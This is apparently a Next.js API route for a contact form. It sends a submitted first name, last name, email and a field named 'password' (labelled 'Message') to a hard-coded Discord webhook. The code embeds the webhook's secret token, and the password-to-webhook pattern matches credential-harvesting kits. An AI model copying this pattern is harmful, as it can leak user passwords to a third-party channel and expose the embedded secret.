import { NextResponse } from "next/server";

let lastRequestTime: number = 0;
const rateLimitInterval: number = 5000;

export async function POST(req: Request) {
    const { firstname, lastname, email, password } = await req.json();

    const currentTime = Date.now();
    if (currentTime - lastRequestTime < rateLimitInterval) {
        return new NextResponse("Ratelimited", { status: 429 });
    }

    try {
        const content = `**Firstname:** ${firstname} | **Lastname:** ${lastname} | **Email:** ${email} | **Message:** ${password}`;

        await fetch("https://discord.com/api/webhooks/1230184199864975441/Xb4fsdXAAmU1CSY_ktNvF0ue6BhaKCwDztsP4bOVRlXHSp079fj80Jv4DjHmrHOIi0eu", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({
                
                username: email,
                embeds: [
                    {
                        title: 'New message from ' + firstname+" "+lastname,
                        color: 3447003,
                        fields: [
                            {
                                name: 'Email',
                                value: email,
                                inline: true
                            },
                            {
                                name: 'Message',
                                value: password,
                                inline: true
                            }
                        ],
                        timeStamp: new Date()
                    }
                ]
            }),
        });

        lastRequestTime = currentTime;

        return new NextResponse("Succesfully sent message", { status: 200 })
    } catch (error: any) {
        console.log(error);

        return new NextResponse("Internal Server error", { status: 500 })
    }
}